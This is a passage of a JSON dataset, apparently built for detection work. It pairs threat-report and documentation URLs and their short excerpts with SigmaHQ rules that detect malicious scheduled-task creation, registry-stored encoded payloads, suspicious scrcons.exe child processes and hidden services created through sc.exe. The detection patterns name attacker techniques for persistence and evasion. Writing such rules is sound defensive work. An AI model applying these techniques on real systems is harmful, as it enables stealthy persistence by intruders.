            "/Create /Xml \"C:\\Users\\",
            "\\AppData\\Local\\Temp\\.CR.",
            "Avira_Security_Installation.xml"
          ]
        },
        "filter_optional_avira_other": {
          "CommandLine|contains|all": [
            "/Create /F /TN",
            "/Xml ",
            "\\AppData\\Local\\Temp\\is-",
            "Avira_"
          ],
          "CommandLine|contains": [
            ".tmp\\UpdateFallbackTask.xml",
            ".tmp\\WatchdogServiceControlManagerTimeout.xml",
            ".tmp\\SystrayAutostart.xml",
            ".tmp\\MaintenanceTask.xml"
          ]
        },
        "filter_optional_klite_codec": {
          "CommandLine|contains|all": [
            "\\AppData\\Local\\Temp\\",
            "/Create /TN \"klcp_update\" /XML ",
            "\\klcp_update_task.xml"
          ]
        },
        "condition": "( all of selection_1_* or all of selection_2_* ) and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Benign scheduled tasks creations or executions that happen often during software installations",
        "Software that uses the AppData folder and scheduled tasks to update the software in the AppData folders"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_env_folder.yml"
  },
  "475": {
    "url": "https://www.joesandbox.com/analysis/514608/0/html#324415FF7D8324231381BAD48A052F85DF04",
    "markdown": "",
    "sigma_rule": {
      "title": "Schedule Task Creation From Env Variable Or Potentially Suspicious Path Via Schtasks.EXE",
      "id": "81325ce1-be01-4250-944f-b4789644556f",
      "related": [
        {
          "id": "43f487f0-755f-4c2a-bce7-d6d2eec2fcf8",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects Schtask creations that point to a suspicious folder or an environment variable often used by malware",
      "references": [
        "https://www.welivesecurity.com/2022/01/18/donot-go-do-not-respawn/",
        "https://www.joesandbox.com/analysis/514608/0/html#324415FF7D8324231381BAD48A052F85DF04",
        "https://blog.talosintelligence.com/gophish-powerrat-dcrat/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-21",
      "modified": "2024-10-28",
      "tags": [
        "attack.execution",
        "attack.t1053.005"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_1_create": {
          "Image|endswith": "\\schtasks.exe",
          "CommandLine|contains": " /create "
        },
        "selection_1_all_folders": {
          "CommandLine|contains": [
            ":\\Perflogs",
            ":\\Users\\All Users\\",
            ":\\Users\\Default\\",
            ":\\Users\\Public",
            ":\\Windows\\Temp",
            "\\AppData\\Local\\",
            "\\AppData\\Roaming\\",
            "%AppData%",
            "%Public%"
          ]
        },
        "selection_2_parent": {
          "ParentCommandLine|endswith": "\\svchost.exe -k netsvcs -p -s Schedule"
        },
        "selection_2_some_folders": {
          "CommandLine|contains": [
            ":\\Perflogs",
            ":\\Windows\\Temp",
            "\\Users\\Public",
            "%Public%"
          ]
        },
        "filter_optional_other": [
          {
            "ParentCommandLine|contains": "unattended.ini"
          },
          {
            "CommandLine|contains": "update_task.xml"
          }
        ],
        "filter_optional_team_viewer": {
          "CommandLine|contains": "/Create /TN TVInstallRestore /TR"
        },
        "filter_optional_avira_install": {
          "CommandLine|contains|all": [
            "/Create /Xml \"C:\\Users\\",
            "\\AppData\\Local\\Temp\\.CR.",
            "Avira_Security_Installation.xml"
          ]
        },
        "filter_optional_avira_other": {
          "CommandLine|contains|all": [
            "/Create /F /TN",
            "/Xml ",
            "\\AppData\\Local\\Temp\\is-",
            "Avira_"
          ],
          "CommandLine|contains": [
            ".tmp\\UpdateFallbackTask.xml",
            ".tmp\\WatchdogServiceControlManagerTimeout.xml",
            ".tmp\\SystrayAutostart.xml",
            ".tmp\\MaintenanceTask.xml"
          ]
        },
        "filter_optional_klite_codec": {
          "CommandLine|contains|all": [
            "\\AppData\\Local\\Temp\\",
            "/Create /TN \"klcp_update\" /XML ",
            "\\klcp_update_task.xml"
          ]
        },
        "condition": "( all of selection_1_* or all of selection_2_* ) and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Benign scheduled tasks creations or executions that happen often during software installations",
        "Software that uses the AppData folder and scheduled tasks to update the software in the AppData folders"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_env_folder.yml"
  },
  "476": {
    "url": "https://blog.talosintelligence.com/gophish-powerrat-dcrat/",
    "markdown": "# Threat actor abuses Gophish to deliver new PowerRAT and DCRAT October 22 **Categories:** RAT, Threats --- - Cisco Talos recently discovered a phishing campaign using an open-source phishing toolkit called Gophish by an unknown threat actor. - The campaign involves modular infection chains that are either Maldoc or HTML-based infections and require the victim’s intervention to trigger the infection chain. - Talos discovered an undocumented PowerShell RAT we’re calling PowerRAT, as one of the payloads and another infamous Remote Access Tool (RAT) DCRAT. - We found a few placeholders for base64 encoded PowerShell scripts in the PowerRAT, indicating that",
    "sigma_rule": {
      "title": "Schedule Task Creation From Env Variable Or Potentially Suspicious Path Via Schtasks.EXE",
      "id": "81325ce1-be01-4250-944f-b4789644556f",
      "related": [
        {
          "id": "43f487f0-755f-4c2a-bce7-d6d2eec2fcf8",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects Schtask creations that point to a suspicious folder or an environment variable often used by malware",
      "references": [
        "https://www.welivesecurity.com/2022/01/18/donot-go-do-not-respawn/",
        "https://www.joesandbox.com/analysis/514608/0/html#324415FF7D8324231381BAD48A052F85DF04",
        "https://blog.talosintelligence.com/gophish-powerrat-dcrat/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-21",
      "modified": "2024-10-28",
      "tags": [
        "attack.execution",
        "attack.t1053.005"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_1_create": {
          "Image|endswith": "\\schtasks.exe",
          "CommandLine|contains": " /create "
        },
        "selection_1_all_folders": {
          "CommandLine|contains": [
            ":\\Perflogs",
            ":\\Users\\All Users\\",
            ":\\Users\\Default\\",
            ":\\Users\\Public",
            ":\\Windows\\Temp",
            "\\AppData\\Local\\",
            "\\AppData\\Roaming\\",
            "%AppData%",
            "%Public%"
          ]
        },
        "selection_2_parent": {
          "ParentCommandLine|endswith": "\\svchost.exe -k netsvcs -p -s Schedule"
        },
        "selection_2_some_folders": {
          "CommandLine|contains": [
            ":\\Perflogs",
            ":\\Windows\\Temp",
            "\\Users\\Public",
            "%Public%"
          ]
        },
        "filter_optional_other": [
          {
            "ParentCommandLine|contains": "unattended.ini"
          },
          {
            "CommandLine|contains": "update_task.xml"
          }
        ],
        "filter_optional_team_viewer": {
          "CommandLine|contains": "/Create /TN TVInstallRestore /TR"
        },
        "filter_optional_avira_install": {
          "CommandLine|contains|all": [
            "/Create /Xml \"C:\\Users\\",
            "\\AppData\\Local\\Temp\\.CR.",
            "Avira_Security_Installation.xml"
          ]
        },
        "filter_optional_avira_other": {
          "CommandLine|contains|all": [
            "/Create /F /TN",
            "/Xml ",
            "\\AppData\\Local\\Temp\\is-",
            "Avira_"
          ],
          "CommandLine|contains": [
            ".tmp\\UpdateFallbackTask.xml",
            ".tmp\\WatchdogServiceControlManagerTimeout.xml",
            ".tmp\\SystrayAutostart.xml",
            ".tmp\\MaintenanceTask.xml"
          ]
        },
        "filter_optional_klite_codec": {
          "CommandLine|contains|all": [
            "\\AppData\\Local\\Temp\\",
            "/Create /TN \"klcp_update\" /XML ",
            "\\klcp_update_task.xml"
          ]
        },
        "condition": "( all of selection_1_* or all of selection_2_* ) and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Benign scheduled tasks creations or executions that happen often during software installations",
        "Software that uses the AppData folder and scheduled tasks to update the software in the AppData folders"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_env_folder.yml"
  },
  "477": {
    "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/lazarus-dream-job-chemical",
    "markdown": "# Lazarus Targets Chemical Sector **Continuation of Operation Dream Job sees North Korea-linked APT target orgs in espionage campaign.** Posted: 14 Apr, 2022 Threat Intelligence --- Symantec, a division of Broadcom Software, has observed the North Korea-linked advanced persistent threat (APT) group known as Lazarus conducting an espionage campaign targeting organizations operating within the chemical sector. The campaign appears to be a continuation of Lazarus activity dubbed Operation Dream Job, which was first observed in August 2020. Symantec tracks this sub-set of Lazarus activity under the name Pompilus. ## Operation Dream Job Operation Dream Job involves Lazarus using fake job",
    "sigma_rule": {
      "title": "Schtasks From Suspicious Folders",
      "id": "8a8379b8-780b-4dbf-b1e9-31c8d112fefb",
      "status": "test",
      "description": "Detects scheduled task creations that have suspicious action command and folder combinations",
      "references": [
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/lazarus-dream-job-chemical"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-04-15",
      "modified": "2022-11-18",
      "tags": [
        "attack.execution",
        "attack.t1053.005"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\schtasks.exe"
          },
          {
            "OriginalFileName": "schtasks.exe"
          }
        ],
        "selection_create": {
          "CommandLine|contains": " /create "
        },
        "selection_command": {
          "CommandLine|contains": [
            "powershell",
            "pwsh",
            "cmd /c ",
            "cmd /k ",
            "cmd /r ",
            "cmd.exe /c ",
            "cmd.exe /k ",
            "cmd.exe /r "
          ]
        },
        "selection_all_folders": {
          "CommandLine|contains": [
            "C:\\ProgramData\\",
            "%ProgramData%"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_folder_combos.yml"
  },
  "478": {
    "url": "https://thedfirreport.com/2022/10/31/follina-exploit-leads-to-domain-compromise/",
    "markdown": "# Follina Exploit Leads to Domain Compromise **Categories:** adfind cobaltstrike Qbot **Published on:** October 31, 2022 --- In early June 2022, we observed an intrusion where a threat actor gained initial access by exploiting the CVE-2022-30190 (Follina) vulnerability, which triggered a Qbot infection chain. Qbot, also known as Qakbot or Pinksliplot, is actively developed and capable of a number of functions from reconnaissance, lateral movement, data exfiltration, to delivering other payloads acting as an initial access broker. Qbot is regarded by US CERT as being one of the 2021 Top Malware Strains in Alert (AA22-216A). In the past, we’ve covered",
    "sigma_rule": {
      "title": "Suspicious Scheduled Task Name As GUID",
      "id": "ff2fff64-4cd6-4a2b-ba7d-e28a30bbe66b",
      "status": "test",
      "description": "Detects creation of a scheduled task with a GUID like name",
      "references": [
        "https://thedfirreport.com/2022/10/31/follina-exploit-leads-to-domain-compromise/",
        "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-10-31",
      "tags": [
        "attack.execution",
        "attack.t1053.005"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": {
          "Image|endswith": "\\schtasks.exe",
          "CommandLine|contains": "/Create "
        },
        "selection_tn": {
          "CommandLine|contains": [
            "/TN \"{",
            "/TN '{",
            "/TN {"
          ]
        },
        "selection_end": {
          "CommandLine|contains": [
            "}\"",
            "}'",
            "} "
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate software naming their tasks as GUIDs"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_guid_task_name.yml"
  },
  "479": {
    "url": "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/",
    "markdown": "# Qbot and Zerologon Lead To Full Domain Compromise **Categories:** adfind, cobaltstrike, Qbot **Published on:** February 21, 2022 In this intrusion (from November 2021), a threat actor gained its initial foothold in the environment through the use of Qbot (a.k.a. Quakbot/Qakbot) malware. Soon after execution of the Qbot payload, the malware established C2 connectivity and created persistence on the beachhead. Successful exploitation of the Zerologon vulnerability (CVE-2020-1472) allowed the threat actors to obtain domain admin privileges. This level of access was abused to deploy additional Cobalt Strike beacons and consequently pivot to other sensitive hosts within the network. The threat",
    "sigma_rule": {
      "title": "Suspicious Scheduled Task Name As GUID",
      "id": "ff2fff64-4cd6-4a2b-ba7d-e28a30bbe66b",
      "status": "test",
      "description": "Detects creation of a scheduled task with a GUID like name",
      "references": [
        "https://thedfirreport.com/2022/10/31/follina-exploit-leads-to-domain-compromise/",
        "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-10-31",
      "tags": [
        "attack.execution",
        "attack.t1053.005"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": {
          "Image|endswith": "\\schtasks.exe",
          "CommandLine|contains": "/Create "
        },
        "selection_tn": {
          "CommandLine|contains": [
            "/TN \"{",
            "/TN '{",
            "/TN {"
          ]
        },
        "selection_end": {
          "CommandLine|contains": [
            "}\"",
            "}'",
            "} "
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate software naming their tasks as GUIDs"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_guid_task_name.yml"
  },
  "480": {
    "url": "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/",
    "markdown": "# Qbot and Zerologon Lead To Full Domain Compromise **Categories:** adfind, cobaltstrike, Qbot **Published on:** February 21, 2022 In this intrusion (from November 2021), a threat actor gained its initial foothold in the environment through the use of Qbot (a.k.a. Quakbot/Qakbot) malware. Soon after execution of the Qbot payload, the malware established C2 connectivity and created persistence on the beachhead. Successful exploitation of the Zerologon vulnerability (CVE-2020-1472) allowed the threat actors to obtain domain admin privileges. This level of access was abused to deploy additional Cobalt Strike beacons and consequently pivot to other sensitive hosts within the network. The threat",
    "sigma_rule": {
      "title": "Scheduled Task Executing Payload from Registry",
      "id": "86588b36-c6d3-465f-9cee-8f9093e07798",
      "related": [
        {
          "id": "c4eeeeae-89f4-43a7-8b48-8d1bdfa66c78",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the creation of a schtasks that potentially executes a payload stored in the Windows Registry using PowerShell.",
      "references": [
        "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/"
      ],
      "author": "X__Junior (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-07-18",
      "tags": [
        "attack.execution",
        "attack.persistence",
        "attack.t1053.005",
        "attack.t1059.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\schtasks.exe"
          },
          {
            "OriginalFileName": "schtasks.exe"
          }
        ],
        "selection_cli_create": {
          "CommandLine|contains": "/Create"
        },
        "selection_cli_get": {
          "CommandLine|contains": [
            "Get-ItemProperty",
            " gp "
          ]
        },
        "selection_cli_hive": {
          "CommandLine|contains": [
            "HKCU:",
            "HKLM:",
            "registry::",
            "HKEY_"
          ]
        },
        "filter_main_encoding": {
          "CommandLine|contains": [
            "FromBase64String",
            "encodedcommand"
          ]
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_reg_loader.yml"
  },
  "481": {
    "url": "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/",
    "markdown": "# Qbot and Zerologon Lead To Full Domain Compromise **Categories:** adfind, cobaltstrike, Qbot **Published on:** February 21, 2022 In this intrusion (from November 2021), a threat actor gained its initial foothold in the environment through the use of Qbot (a.k.a. Quakbot/Qakbot) malware. Soon after execution of the Qbot payload, the malware established C2 connectivity and created persistence on the beachhead. Successful exploitation of the Zerologon vulnerability (CVE-2020-1472) allowed the threat actors to obtain domain admin privileges. This level of access was abused to deploy additional Cobalt Strike beacons and consequently pivot to other sensitive hosts within the network. The threat",
    "sigma_rule": {
      "title": "Scheduled Task Executing Encoded Payload from Registry",
      "id": "c4eeeeae-89f4-43a7-8b48-8d1bdfa66c78",
      "status": "test",
      "description": "Detects the creation of a schtask that potentially executes a base64 encoded payload stored in the Windows Registry using PowerShell.",
      "references": [
        "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/"
      ],
      "author": "pH-T (Nextron Systems), @Kostastsale, TheDFIRReport, X__Junior (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-02-12",
      "modified": "2023-02-04",
      "tags": [
        "attack.execution",
        "attack.persistence",
        "attack.t1053.005",
        "attack.t1059.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\schtasks.exe"
          },
          {
            "OriginalFileName": "schtasks.exe"
          }
        ],
        "selection_cli_create": {
          "CommandLine|contains": "/Create"
        },
        "selection_cli_encoding": {
          "CommandLine|contains": [
            "FromBase64String",
            "encodedcommand"
          ]
        },
        "selection_cli_get": {
          "CommandLine|contains": [
            "Get-ItemProperty",
            " gp "
          ]
        },
        "selection_cli_hive": {
          "CommandLine|contains": [
            "HKCU:",
            "HKLM:",
            "registry::",
            "HKEY_"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_reg_loader_encoded.yml"
  },
  "482": {
    "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-change",
    "markdown": "# schtasks change Changes one or more of the following properties of a task: - The program that the task runs (**/tr**) - The user account under which the task runs (**/ru**) - The password for the user account (**/rp**) - Adds the interactive-only property to the task (**/it**) ## Required permissions - To schedule, view, and change all tasks on the local computer, you must be a member of the Administrators group. - To schedule, view, and change all tasks on the remote computer, you must be a member of the Administrators group on the remote computer, or you",
    "sigma_rule": {
      "title": "Suspicious Schtasks Schedule Types",
      "id": "24c8392b-aa3c-46b7-a545-43f71657fe98",
      "related": [
        {
          "id": "7a02e22e-b885-4404-b38b-1ddc7e65258a",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects scheduled task creations or modification on a suspicious schedule type",
      "references": [
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-change",
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create",
        "https://blog.talosintelligence.com/lazarus-three-rats/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-09",
      "tags": [
        "attack.execution",
        "attack.t1053.005"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\schtasks.exe"
          },
          {
            "OriginalFileName": "schtasks.exe"
          }
        ],
        "selection_time": {
          "CommandLine|contains": [
            " ONLOGON ",
            " ONSTART ",
            " ONCE ",
            " ONIDLE "
          ]
        },
        "filter_privs": {
          "CommandLine|contains": [
            "NT AUT",
            " SYSTEM",
            "HIGHEST"
          ]
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "falsepositives": [
        "Legitimate processes that run at logon. Filter according to your environment"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_schedule_type.yml"
  },
  "483": {
    "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create",
    "markdown": "# schtasks create ## Article **Review Date:** 10/10/2023 **Contributors:** 5 contributors ### Applies to: - ✅ Windows Server 2025 - ✅ Windows Server 2022 - ✅ Windows Server 2019 - ✅ Windows Server 2016 - ✅ Windows 11 - ✅ Windows 10 - ✅ Azure Stack HCI, versions 23H2 and 22H2 Schedules a task. ## Syntax ``` schtasks /create /sc <scheduletype> /tn <taskname> /tr <taskrun> [/s <computer> [/u [<domain>\\]<user> [/p <password>]]] [/ru {[<domain>\\]<user> | system}] [/rp <password>] [/mo <modifier>] [/d <day>[,<day>...] | *] [/m <month>[,<month>...]] [/i <idletime>] [/st <starttime>] [/ri <interval>] [{/et <endtime> | /du <duration>} [/k]] [/sd <startdate>] [/ed",
    "sigma_rule": {
      "title": "Suspicious Schtasks Schedule Types",
      "id": "24c8392b-aa3c-46b7-a545-43f71657fe98",
      "related": [
        {
          "id": "7a02e22e-b885-4404-b38b-1ddc7e65258a",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects scheduled task creations or modification on a suspicious schedule type",
      "references": [
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-change",
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create",
        "https://blog.talosintelligence.com/lazarus-three-rats/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-09",
      "tags": [
        "attack.execution",
        "attack.t1053.005"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\schtasks.exe"
          },
          {
            "OriginalFileName": "schtasks.exe"
          }
        ],
        "selection_time": {
          "CommandLine|contains": [
            " ONLOGON ",
            " ONSTART ",
            " ONCE ",
            " ONIDLE "
          ]
        },
        "filter_privs": {
          "CommandLine|contains": [
            "NT AUT",
            " SYSTEM",
            "HIGHEST"
          ]
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "falsepositives": [
        "Legitimate processes that run at logon. Filter according to your environment"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_schedule_type.yml"
  },
  "484": {
    "url": "https://blog.talosintelligence.com/lazarus-three-rats/",
    "markdown": "# Lazarus and the tale of three RATs **Thursday, September 8, 2022 08:01** Threat Spotlight - Cisco Talos has been tracking a new campaign operated by the Lazarus APT group, attributed to North Korea by the United States government. - This campaign involved the exploitation of vulnerabilities in VMWare Horizon to gain an initial foothold into targeted organizations. - Targeted organizations include energy providers from around the world, including those headquartered in the United States, Canada, and Japan. - The campaign is meant to infiltrate organizations around the world for establishing long-term access and subsequently exfiltrating data of interest to",
    "sigma_rule": {
      "title": "Suspicious Schtasks Schedule Types",
      "id": "24c8392b-aa3c-46b7-a545-43f71657fe98",
      "related": [
        {
          "id": "7a02e22e-b885-4404-b38b-1ddc7e65258a",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects scheduled task creations or modification on a suspicious schedule type",
      "references": [
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-change",
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create",
        "https://blog.talosintelligence.com/lazarus-three-rats/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-09",
      "tags": [
        "attack.execution",
        "attack.t1053.005"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\schtasks.exe"
          },
          {
            "OriginalFileName": "schtasks.exe"
          }
        ],
        "selection_time": {
          "CommandLine|contains": [
            " ONLOGON ",
            " ONSTART ",
            " ONCE ",
            " ONIDLE "
          ]
        },
        "filter_privs": {
          "CommandLine|contains": [
            "NT AUT",
            " SYSTEM",
            "HIGHEST"
          ]
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "falsepositives": [
        "Legitimate processes that run at logon. Filter according to your environment"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_schedule_type.yml"
  },
  "485": {
    "url": "https://redcanary.com/blog/child-processes/",
    "markdown": "# Babysitting child processes Our third Diary of a Detection Engineer explores why baseline knowledge of common executables—such as whether they normally spawn child processes—is key to detecting malicious behavior. *Originally published June 16, 2021. Last modified April 30, 2024.* --- In early March 2021, an event fired based on `scrcons.exe` spawning a child process. The child process was `dllhost.exe` with no command-line arguments. Sarah Lewis, the detection engineer working the queue at the time, needed to quickly make sense of the event. She knew that lacking sufficient context, her series of questions in the resulting triage that would follow",
    "sigma_rule": {
      "title": "Script Event Consumer Spawning Process",
      "id": "f6d1dd2f-b8ce-40ca-bc23-062efb686b34",
      "status": "test",
      "description": "Detects a suspicious child process of Script Event Consumer (scrcons.exe).",
      "references": [
        "https://redcanary.com/blog/child-processes/",
        "https://docs-cortex.paloaltonetworks.com/r/Cortex-XDR/Cortex-XDR-Analytics-Alert-Reference-by-data-source/Scrcons.exe-Rare-Child-Process"
      ],
      "author": "Sittikorn S",
      "date": "2021-06-21",
      "modified": "2022-07-14",
      "tags": [
        "attack.execution",
        "attack.t1047"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\scrcons.exe",
          "Image|endswith": [
            "\\svchost.exe",
            "\\dllhost.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\wscript.exe",
            "\\cscript.exe",
            "\\schtasks.exe",
            "\\regsvr32.exe",
            "\\mshta.exe",
            "\\rundll32.exe",
            "\\msiexec.exe",
            "\\msbuild.exe"
          ]
        },
        "condition": "selection"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_scrcons_susp_child_process.yml"
  },
  "486": {
    "url": "https://docs-cortex.paloaltonetworks.com/r/Cortex-XDR/Cortex-XDR-Analytics-Alert-Reference-by-data-source/Scrcons.exe-Rare-Child-Process",
    "markdown": "# Short-lived user account ## Synopsis | Activation Period | 14 Days | |-------------------|---------| | Training Period | 30 Days | | Test Period | 1 Hour | | Deduplication Period | 1 Hour | | Required Data | Requires one of the following data sources: | | | - Windows Event Collector OR | | | - XDR Agent with eXtended Threat Hunting (XTH) | | Detection Modules | Identity Analytics | | Detector Tags | | | ATT&CK Tactic | Defense Evasion (TA0005) | | ATT&CK Technique | Valid Accounts (T1078) | | Severity | Low | ##",
    "sigma_rule": {
      "title": "Script Event Consumer Spawning Process",
      "id": "f6d1dd2f-b8ce-40ca-bc23-062efb686b34",
      "status": "test",
      "description": "Detects a suspicious child process of Script Event Consumer (scrcons.exe).",
      "references": [
        "https://redcanary.com/blog/child-processes/",
        "https://docs-cortex.paloaltonetworks.com/r/Cortex-XDR/Cortex-XDR-Analytics-Alert-Reference-by-data-source/Scrcons.exe-Rare-Child-Process"
      ],
      "author": "Sittikorn S",
      "date": "2021-06-21",
      "modified": "2022-07-14",
      "tags": [
        "attack.execution",
        "attack.t1047"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\scrcons.exe",
          "Image|endswith": [
            "\\svchost.exe",
            "\\dllhost.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\wscript.exe",
            "\\cscript.exe",
            "\\schtasks.exe",
            "\\regsvr32.exe",
            "\\mshta.exe",
            "\\rundll32.exe",
            "\\msiexec.exe",
            "\\msbuild.exe"
          ]
        },
        "condition": "selection"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_scrcons_susp_child_process.yml"
  },
  "487": {
    "url": "https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html",
    "markdown": "# Threat hunting in large datasets by clustering security events _Monday, October 4, 2021_ [How Talos finds threats in large data sets](https://www.youtube.com/watch?v=5nFIgAN5Nq4) * Security tools can produce very large amounts of data that even the most sophisticated organizations may struggle to manage. * Big data processing tools, such as Spark, can be a powerful tool in the arsenal of security teams. * This post walks through threat hunting on large datasets by clustering similar events to reduce search space and provide additional context. ## Introduction Cisco Talos processes 1.5 million new pieces of malware each day. Converting such a large",
    "sigma_rule": {
      "title": "Service DACL Abuse To Hide Services Via Sc.EXE",
      "id": "a537cfc3-4297-4789-92b5-345bfd845ad0",
      "related": [
        {
          "id": "99cf1e02-00fb-4c0d-8375-563f978dfd37",
          "type": "similar"
        },
        {
          "id": "98c5aeef-32d5-492f-b174-64a691896d25",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects usage of the \"sc.exe\" utility adding a new service with special permission seen used by threat actors which makes the service hidden and unremovable.",
      "references": [
        "https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html",
        "https://www.sans.org/blog/red-team-tactics-hiding-windows-services/",
        "https://twitter.com/Alh4zr3d/status/1580925761996828672",
        "https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/"
      ],
      "author": "Andreas Hunkeler (@Karneades)",
      "date": "2021-12-20",
      "modified": "2022-08-08",
      "tags": [
        "attack.persistence",
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1574.011"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\sc.exe"
          },
          {
            "OriginalFileName": "sc.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "sdset",
            "DCLCWPDTSD"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
